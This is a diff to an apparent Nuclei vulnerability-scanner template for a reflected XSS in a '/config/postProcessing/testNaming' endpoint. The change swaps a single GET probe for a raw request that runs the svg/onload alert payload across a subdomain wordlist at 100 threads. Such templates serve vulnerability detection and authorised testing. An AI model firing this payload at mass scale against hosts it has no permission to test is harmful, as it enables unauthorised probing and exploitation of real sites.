@@ -17,9 +17,16 @@ info:
   tags: xss
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        GET /config/postProcessing/testNaming?pattern=%3Csvg/onload=alert(document.domain)%3E HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
     matchers-condition: and
     matchers:
       - type: status
